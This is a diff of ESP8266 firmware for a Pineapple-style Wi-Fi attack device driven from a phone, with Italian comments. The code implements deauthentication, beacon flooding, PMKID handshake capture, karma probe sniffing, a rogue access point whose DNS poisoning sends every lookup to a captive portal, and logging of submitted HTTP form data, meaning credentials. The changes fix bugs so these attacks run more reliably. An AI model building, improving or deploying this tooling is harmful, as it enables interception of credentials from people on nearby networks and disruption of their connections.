@@ -1,30 +1,36 @@
-// RedHatSec Bridge 8266 v3 — STA-only, active scan async, TX buffered
+// RedHatSec Bridge 8266 v3.1 — STA + rogue AP + NAT (PineApple-style)
 //
 //   iPhone --TCP:3333--> ESP8266 (STA su hotspot iPhone)
 //
 //   Protocollo RHS (frame TX esp→app):
 //     [0x5A][len_lo][len_hi][cmd][status][payload...][crc8(off1, 4+len)]
-//
 //   Protocollo RHS (frame RX app→esp):
 //     [0xA5][len_lo][len_hi][rsvd][cmd][payload...][crc8(off1, 4+len)]
 //
 //   Cmd:
-//     0x01 ping                         → "RHS-8266"
-//     0x02 scan[sec]                    → [rssi][ch][bssid6][sec][ssidlen][ssid]*
-//     0x03 wifiResults                  → stessi risultati di 0x02 (senza rescan)
-//     0x04 deauth[mac6][ch][count]      → "deauth ok"
-//     0x05 beacon[count][len][ssid]...  → armato (loop in background)
-//     0x06 pmkid[mac6][ch]              → EAPOL raw (max 128B) o "no eapol"
-//     0x07 stop                         → ferma beacon + pmkid
-//     0x08 join[len][ssid][plen][pass]  → IP locale (stringa) o "join failed"
-//     0x10 tcp_scan[ip4][count][port u16 xN] → [port u16][bannerLen][banner]*
-//     0x11 tcp_roundtrip[ip4][port u16][tcs][plen u16][payload] → bytes
-//     0x12 udp_roundtrip[ip4][port u16][tcs][plen u16][payload] → bytes
+//     0x01 ping
+//     0x02 scan[sec]
+//     0x03 wifiResults
+//     0x04 deauth[mac6][ch][count]              (rifiutato se rogue attivo)
+//     0x05 beacon[count][len][ssid]...
+//     0x06 pmkid[mac6][ch]
+//     0x07 stop
+//     0x08 join[len][ssid][plen][pass]
+//     0x10 tcp_scan[ip4][count][port u16 xN]
+//     0x11 tcp_roundtrip[ip4][port u16][tcs][plen u16][payload]
+//     0x12 udp_roundtrip[ip4][port u16][tcs][plen u16][payload]
+//     0x13 rogueStart[ssidLen][ssid][passLen][pass][dnsFwd]
+//     0x14 rogueStop
+//     0x15 rogueClients
+//     0x16 karma[on]
+//     0x17 portalSet[len u16][html]
+//     0x18 nat[on][dnsFwd]
+//     0x19 sniffLog
 
 #include <ESP8266WiFi.h>
 #include <WiFiUdp.h>
 #include <user_interface.h>
-#include <lwip/napt.h>   // ip_napt_enable: NAT reale per i client del rogue AP
+#include <lwip/napt.h>
 
 // ============ CONFIG ============
 const char *STA_SSID = "Hexxeted";
@@ -70,22 +76,20 @@ struct APEntry { uint8_t bssid[6]; uint8_t ch; int8_t rssi; char ssid[33]; uint8
 APEntry aps[24];
 int apCount = 0;
 
-// ============ rogue AP (PineApple) ============
+// ============ rogue AP ============
 bool rogue = false;
 char rogueSsid[33];
-uint8_t roguePass[65];
+char roguePass[65];
 uint8_t roguePassLen = 0;
-bool dnsPoison = false;
-char portalPage[800];
+bool dnsFwd = false;
+char portalPage[801];
 int portalLen = 0;
 bool karmaArmed = false;
 String probeSsids[24];
 int probeCount = 0;
 
-// sniffing traffico client: DNS qname + HTTP portal (form = credenziali)
 String sniffLog[20];
 int sniffCount = 0;
-bool dnsFwd = false;
 IPAddress dnsClientIP;
 uint16_t dnsClientPort = 0;
 bool dnsPending = false;
@@ -139,10 +143,10 @@ void sendFrame(uint8_t cmdEcho, uint8_t status, const uint8_t *payload, int len)
                 cmdEcho, status, len, (client && client.connected()) ? "" : " (buffered)");
 }
 
-// ============ PMKID sniffer ============
+// ============ PMKID + karma sniffer ============
 void snifferCb(uint8_t *buf, uint16_t len) {
-  // karma: probe request (fc 0x40/0x50) → SSID unici nella lista
-  if (karmaArmed && !pmkidArmed && len > 26 && (buf[0] == 0x40 || buf[0] == 0x50)) {
+  // FIX #5: solo probe REQUEST (0x40), non probe response (0x50)
+  if (karmaArmed && !pmkidArmed && len > 26 && buf[0] == 0x40) {
     int o = 24;
     while (o + 2 <= len && o < 220) {
       uint8_t eid = buf[o], el = buf[o + 1];
@@ -318,12 +322,11 @@ void feedRx(const uint8_t *d, int n) {
   }
 }
 
-// ============ rogue AP: DNS poison/forward + captive portal ============
+// ============ DNS (poison o forward) ============
 void dnsTick() {
   if (!rogue) return;
   int ps = dnsSrv.parsePacket();
   if (ps <= 0) return;
-  // risposta upstream in forward mode: porta sorgente 53
   if (dnsFwd && dnsSrv.remotePort() == 53) {
     if (dnsPending && millis() - dnsPendingAt > 4000) dnsPending = false;
     static uint8_t rp[512];
@@ -339,7 +342,6 @@ void dnsTick() {
   static uint8_t q[512];
   int n = dnsSrv.read(q, sizeof(q));
   if (n < 17) return;
-  // QNAME (offset 12, label len-prefixed, stop su 0 o pointer 0xC0)
   String qn;
   int o = 12;
   while (o < n && q[o] > 0 && q[o] < 64 && o + 1 + q[o] <= n) {
@@ -357,17 +359,18 @@ void dnsTick() {
   dnsClientIP = dnsSrv.remoteIP();
   dnsClientPort = dnsSrv.remotePort();
   if (!dnsFwd) {
-    // poison: tutte le A → 192.168.4.1 (captive portal + HTTP capture)
+    // FIX #3: captive portal IP dinamico, non hardcoded
+    IPAddress cip = WiFi.softAPIP();
     q[2] = 0x85; q[3] = 0x80;
     q[6] = 0; q[7] = 1;
-    static const uint8_t ans[16] = {0xC0, 0x0C, 0x00, 0x01, 0x00, 0x01,
-                                    0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 192, 168, 4, 1};
+    uint8_t ans[16] = {0xC0, 0x0C, 0x00, 0x01, 0x00, 0x01,
+                       0x00, 0x00, 0x00, 0x01, 0x00, 0x04,
+                       cip[0], cip[1], cip[2], cip[3]};
     dnsSrv.beginPacket(dnsClientIP, dnsClientPort);
     dnsSrv.write(q, n);
     dnsSrv.write(ans, sizeof(ans));
     dnsSrv.endPacket();
   } else {
-    // forward al resolver dell'hotspot: internet reale + log qname
     IPAddress up = WiFi.dnsIP();
     if (up == IPAddress(0, 0, 0, 0)) return;
     dnsSrv.beginPacket(up, 53);
@@ -378,6 +381,7 @@ void dnsTick() {
   }
 }
 
+// ============ Captive portal HTTP ============
 void portalTick() {
   if (!rogue) return;
   WiFiClient c = portalSrv.available();
@@ -387,7 +391,6 @@ void portalTick() {
   while (c.connected() && millis() - t0 < 2000) {
     while (c.available()) head += (char)c.read();
     if (head.indexOf("\r\n\r\n") >= 0) {
-      // POST: aspetto il body completo (content-length, max 600B)
       int clIdx = head.indexOf("Content-Length:");
       if (clIdx < 0) clIdx = head.indexOf("content-length:");
       if (clIdx >= 0) {
@@ -396,14 +399,13 @@ void portalTick() {
           uint32_t t1 = millis();
           while (c.connected() && millis() - t1 < 1500) {
             while (c.available()) head += (char)c.read();
-            if (head.length() >= head.indexOf("\r\n\r\n") + 4 + cl) break;
+            if ((int)head.length() >= (int)head.indexOf("\r\n\r\n") + 4 + cl) break;
           }
         }
       }
       break;
     }
   }
-  // capture: request line + Host + form body (credenziali in chiaro)
   int sp = head.indexOf(' ');
   String method = (sp > 0) ? head.substring(0, sp) : "?";
   String path = "";
@@ -463,6 +465,8 @@ void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
     }
 
     case 0x04:
+      // FIX #8: deauth cambia canale → ucciderebbe il rogue AP
+      if (rogue) { sendFrame(0x04, 0x03, (const uint8_t *)"rogue active", 12); break; }
       if (plen >= 8) {
         sendDeauth(pl, pl[6], pl[7]);
         sendFrame(0x04, 0x00, (const uint8_t *)"deauth ok", 9);
@@ -497,6 +501,8 @@ void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
 
     case 0x06:
       if (plen >= 7) {
+        // FIX #4: mutua esclusione con karma
+        karmaArmed = false;
         memcpy(pmkidTarget, pl, 6);
         pmkidTargetCh = pl[6];
         pmkidCaptured = false;
@@ -531,7 +537,7 @@ void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
       sendFrame(0x07, 0x00, (const uint8_t *)"stopped", 7);
       break;
 
-    case 0x08: {  // join — FIX: disconnect(false), no radio off, reset su fail
+    case 0x08: {
       int p = 0;
       if (plen < 2) { sendFrame(0x08, 0x02, (const uint8_t *)"bad args", 8); break; }
       int sl = pl[p++];
@@ -545,8 +551,9 @@ void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
       wifi_promiscuous_enable(0);
       beaconActive = false;
       pmkidArmed = false;
+      karmaArmed = false;
 
-      WiFi.disconnect(false);   // FIX: radio resta on, niente WIFI_OFF inutile
+      WiFi.disconnect(false);
       delay(200);
       WiFi.mode(WIFI_STA);
       WiFi.begin(ssid, pass[0] ? pass : NULL);
@@ -631,48 +638,56 @@ void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
       break;
     }
 
-    case 0x13: {  // rogueStart[ssidLen][ssid][passLen][pass][dnsPoison] — AP+STA (il bridge resta su hotspot)
-      int p = 0;
+    case 0x13: {  // rogueStart
       if (plen < 2) { sendFrame(0x13, 0x02, (const uint8_t *)"bad args", 8); break; }
+      if (WiFi.status() != WL_CONNECTED) { sendFrame(0x13, 0x02, (const uint8_t *)"sta down", 8); break; }
+      int p = 0;
       int sl = pl[p++];
       if (p + sl > plen || sl > 32) { sendFrame(0x13, 0x02, (const uint8_t *)"bad args", 8); break; }
       memcpy(rogueSsid, pl + p, sl); rogueSsid[sl] = 0; p += sl;
       int pw = 0;
       if (p < plen) pw = pl[p++];
       if (p + pw > plen || pw > 64) { sendFrame(0x13, 0x02, (const uint8_t *)"bad args", 8); break; }
-      memcpy(roguePass, pl + p, pw); roguePassLen = pw; p += pw;
-      dnsFwd = p < plen ? pl[p] != 0 : true;   // default: internet reale + log qname
-      dnsPoison = !dnsFwd;
+      if (pw > 0 && pw < 8) { sendFrame(0x13, 0x02, (const uint8_t *)"pass 8-64", 9); break; }
+      memcpy(roguePass, pl + p, pw);
+      roguePass[pw] = 0;              // FIX #1: null terminator
+      roguePassLen = pw;
+      p += pw;
+      dnsFwd = p < plen ? pl[p] != 0 : true;
 
       wifi_promiscuous_enable(0);
       karmaArmed = false;
-      // AP+STA: softAP segue il canale dello STA → il bridge TCP (hotspot) sopravvive
-      if (!WiFi.softAP(rogueSsid, pw ? (const char *)roguePass : NULL, apChannel)) {
+      // FIX #6: mode esplicito prima di softAP
+      WiFi.mode(WIFI_AP_STA);
+      delay(50);
+      if (!WiFi.softAP(rogueSsid, pw ? roguePass : NULL, apChannel)) {
         sendFrame(0x13, 0x02, (const uint8_t *)"softAP fail", 11);
         break;
       }
       delay(300);
       dnsSrv.stop();
-      dnsSrv.begin(53);                        // listener attivo in entrambe le mode
+      dnsSrv.begin(53);
       portalSrv.stop();
       portalSrv.begin();
       rogue = true;
-      sniffCount = 0;                        // log pulito a ogni rogue session
-      ip_napt_enable((uint32_t)WiFi.localIP(), 1);   // internet passthrough per i client
+      sniffCount = 0;
+      // FIX #7: NAPT solo se STA è effettivamente up
+      ip_napt_enable((uint32_t)WiFi.localIP(), 1);
       Serial.printf("[rogue] %s ch%d dns=%s napt=1\n", rogueSsid, apChannel, dnsFwd ? "forward" : "poison");
       sendFrame(0x13, 0x00, nullptr, 0);
       break;
     }
 
-    case 0x14: {  // rogueStop
+    case 0x14: {
       rogue = false;
-      dnsPoison = false;
       dnsFwd = false;
       dnsPending = false;
       sniffCount = 0;
       dnsSrv.stop();
       portalSrv.stop();
-      ip_napt_enable((uint32_t)WiFi.localIP(), 0);
+      if (WiFi.status() == WL_CONNECTED) {
+        ip_napt_enable((uint32_t)WiFi.localIP(), 0);
+      }
       WiFi.softAPdisconnect(true);
       delay(200);
       WiFi.mode(WIFI_STA);
@@ -682,7 +697,7 @@ void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
       break;
     }
 
-    case 0x15: {  // rogueClients → [cnt][mac6][ip4]*n
+    case 0x15: {
       if (!rogue) { sendFrame(0x15, 0x02, (const uint8_t *)"rogue off", 9); break; }
       struct station_info *st = wifi_softap_get_station_info();
       static uint8_t out[113];
@@ -704,12 +719,14 @@ void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
       break;
     }
 
-    case 0x16: {  // karma[on] — arm/disarm; disarm → CSV probe trovati
+    case 0x16: {
       if (plen < 1) { sendFrame(0x16, 0x02, (const uint8_t *)"bad args", 8); break; }
       if (pl[0]) {
+        // FIX #4: mutua esclusione con PMKID
+        pmkidArmed = false;
         karmaArmed = true;
         probeCount = 0;
-        wifi_promiscuous_enable(1);   // AP resta su, monitor sul canale corrente
+        wifi_promiscuous_enable(1);
         Serial.println("[karma] armed");
         sendFrame(0x16, 0x00, nullptr, 0);
       } else {
@@ -726,19 +743,22 @@ void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
       break;
     }
 
-    case 0x17: {  // portalSet[len u16][html] (max 780B)
+    case 0x17: {
       if (plen < 2) { sendFrame(0x17, 0x02, (const uint8_t *)"bad args", 8); break; }
       int l = pl[0] | (pl[1] << 8);
-      if (2 + l > plen || l > 780) { sendFrame(0x17, 0x02, (const uint8_t *)"bad args", 8); break; }
+      if (2 + l > plen || l > 800) { sendFrame(0x17, 0x02, (const uint8_t *)"bad args", 8); break; }
       memcpy(portalPage, pl + 2, l);
+      portalPage[l] = 0;              // FIX #2: null terminator
       portalLen = l;
       sendFrame(0x17, 0x00, nullptr, 0);
       break;
     }
 
-    case 0x18: {  // nat[on][dnsFwd] — NAPT passthrough internet + mode DNS (0=poison, 1=forward)
+    case 0x18: {
       if (plen < 2) { sendFrame(0x18, 0x02, (const uint8_t *)"bad args", 8); break; }
-      ip_napt_enable((uint32_t)WiFi.localIP(), pl[0] ? 1 : 0);
+      if (WiFi.status() == WL_CONNECTED) {
+        ip_napt_enable((uint32_t)WiFi.localIP(), pl[0] ? 1 : 0);
+      }
       dnsFwd = pl[1] != 0;
       dnsPending = false;
       Serial.printf("[nat] %d dnsFwd=%d\n", pl[0], pl[1]);
@@ -746,7 +766,7 @@ void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
       break;
     }
 
-    case 0x19: {  // sniffLog → CSV "D:qname|H:http" (DNS visitati + HTTP/form catturati)
+    case 0x19: {
       String csv;
       for (int k = 0; k < sniffCount; k++) {
         if (k) csv += "|";
@@ -796,14 +816,14 @@ void setup() {
                     (int)WiFi.encryptionType(k),
                     WiFi.SSID(k) == STA_SSID ? "  <<<< TROVATA" : "");
     }
-    WiFi.scanDelete();   // FIX: libera la RAM dopo lo scan diagnostico
+    WiFi.scanDelete();
   }
 
   wifi_set_promiscuous_rx_cb(snifferCb);
 
   server.begin();
   server.setNoDelay(true);
-  Serial.printf("[RHS-8266 v3] TCP :%u pronto\n", TCP_PORT);
+  Serial.printf("[RHS-8266 v3.1] TCP :%u pronto\n", TCP_PORT);
 }
 
 // ============ loop ============
@@ -831,12 +851,9 @@ void loop() {
   }
 
   pollScan();
-
-  // rogue AP: DNS poison + captive portal
   dnsTick();
   portalTick();
 
-  // join async — FIX: su timeout reset esplicito a STA_SSID (niente reconnect al target morto)
   if (joinPending) {
     if (WiFi.status() == WL_CONNECTED && WiFi.SSID() == joinTargetSsid) {
       joinPending = false;
@@ -846,15 +863,14 @@ void loop() {
     } else if (millis() - joinStart > 15000) {
       joinPending = false;
       WiFi.disconnect(false);
-      WiFi.begin(STA_SSID, STA_PASS);   // riporta a casa subito
+      WiFi.begin(STA_SSID, STA_PASS);
       sendFrame(0x08, 0x02, (const uint8_t *)"join failed", 11);
       Serial.println("[join] FAIL → reset STA_SSID");
     }
   }
 
-  // manual reconnect — FIX: begin(STA_SSID), non reconnect() al target morto
   static uint32_t lastReconnect = 0;
-  if (!joinPending && !pmkidArmed && !beaconActive &&
+  if (!joinPending && !pmkidArmed && !beaconActive && !rogue &&
       WiFi.status() != WL_CONNECTED && millis() - lastReconnect > 10000) {
     lastReconnect = millis();
     WiFi.begin(STA_SSID, STA_PASS);
@@ -862,7 +878,6 @@ void loop() {
   if (WiFi.status() == WL_CONNECTED) {
     int ch = WiFi.channel();
     if (ch > 0 && apChannel != (uint8_t)ch) apChannel = (uint8_t)ch;
-    // insurance: un reset del link STA azzera il NAPT → riarmo ogni 30s mentre rogue attivo
     static uint32_t lastNapt = 0;
     if (rogue && millis() - lastNapt > 30000) {
       lastNapt = millis();
